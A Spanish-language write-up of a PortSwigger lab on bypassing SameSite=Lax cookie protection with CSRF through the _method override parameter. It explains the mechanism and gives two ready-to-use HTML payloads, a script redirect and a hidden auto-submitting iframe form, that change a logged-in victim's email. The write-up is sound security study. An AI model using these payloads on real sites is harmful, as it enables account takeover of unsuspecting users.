# PortSwigger Lab: SameSite Lax bypass via method override

![PortSwigger](https://img.shields.io/badge/Plataforma-PortSwigger%20Academy-blue)
![Dificultad](https://img.shields.io/badge/Dificultad-F%C3%A1cil-yellow)
![Tipo](https://img.shields.io/badge/Tipo-CSRF%20SameSite%20Bypass-red)
![Estado](https://img.shields.io/badge/Estado-Completada-success)

Writeup del laboratorio de PortSwigger sobre CSRF bypasseando SameSite Lax con method override.

## Técnicas utilizadas

- CSRF (Cross-Site Request Forgery)
- SameSite Lax bypass
- Method Override (_method parameter)
- GET-based CSRF
- Timing attack (GET + post-processing)

## Flujo resumido

```
SameSite=Lax protege POST pero permite GET
→ Descubrir _method=POST parameter
→ GET + _method=POST bypasea SameSite
→ Cookie enviada en GET (antes de procesar _method)
→ Payload GET simple o iframe oculto
→ Exploit server → Víctima
```

## Vulnerabilidad clave

**SameSite Lax** protege contra POST cross-site pero permite GET cross-site.

El servidor acepta **_method=POST** para reinterpretarr petición GET como POST.

Timing: Cookie se envía en GET, **_method se procesa después** de autenticación.

## SameSite valores

| Valor | GET cross-site | POST cross-site |
|-------|---|---|
| Strict | ❌ | ❌ |
| **Lax** | ✅ | ❌ |
| None | ✅ | ✅ |

Chrome default: Si no se especifica, usa **Lax**.

## Ataque

Navegador recibe GET desde atacante:
1. SameSite=Lax: "Es GET, envío cookie" ✅
2. Cookie adjuntada automáticamente
3. Servidor recibe GET + _method=POST
4. Interpreta como POST
5. Autenticación válida (cookie presente)
6. Acción se ejecuta

## Payloads

### Opción 1: Redirección visible

```html
<script>
  document.location = "https://target.com/my-account/change-email?email=attacker@attacker.com&_method=POST"
</script>
```

### Opción 2: Iframe oculto (silencioso)

```html
<iframe name="csrf-frame" style="display:none;"></iframe>
<form action="https://target.com/my-account/change-email" method="GET" target="csrf-frame">
  <input type="hidden" name="_method" value="POST">
  <input type="hidden" name="email" value="attacker@attacker.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

## Por qué funciona

- GET cross-site permitido por SameSite Lax
- Method Override reinterpreta GET como POST
- Cookie enviada antes de procesar _method
- Servidor + navegador coordina mal defensa
- POST es "simulado" después de autenticación

## Afectados

- Laravel (_method)
- Rails (_method)
- Express (_method)
- Otros frameworks con method override

## Referencias

- [PortSwigger — CSRF](https://portswigger.net/web-security/csrf)
- [MDN — SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
- [OWASP — CSRF Prevention](https://owasp.org/www-community/attacks/csrf)
- [Method Override](https://owasp.org/www-community/attacks/HTTP_Parameter_Override)
